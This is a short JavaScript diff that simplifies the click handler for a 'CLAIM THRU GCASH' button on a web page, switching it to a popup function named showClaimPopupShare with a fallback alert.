@@ -594,22 +594,15 @@ function initFacebookShare() {
 // ========== CLAIM THRU GCASH BUTTON - SIMPLE TRIGGER ==========
 function initClaimButton() {
     var claimBtn = document.getElementById('claimGCashBtn');
-    if (!claimBtn) return;
-    
-    var newBtn = claimBtn.cloneNode(true);
-    claimBtn.parentNode.replaceChild(newBtn, claimBtn);
-    claimBtn = newBtn;
-    
-    claimBtn.onclick = function() {
-        console.log("CLAIM THRU GCASH clicked - calling popup.js");
-        
-        if (typeof window.showClaimPopup === 'function') {
-            window.showClaimPopup(150);
-        } else {
-            console.error("showClaimPopup not found");
-            alert("System loading. Please refresh the page.");
-        }
-    };
+    if (claimBtn) {
+        claimBtn.onclick = function() {
+            if (typeof window.showClaimPopupShare === 'function') {
+                window.showClaimPopupShare(150);
+            } else {
+                alert("System loading. Please refresh.");
+            }
+        };
+    }
 }
 
 // ========== INITIALIZE ==========
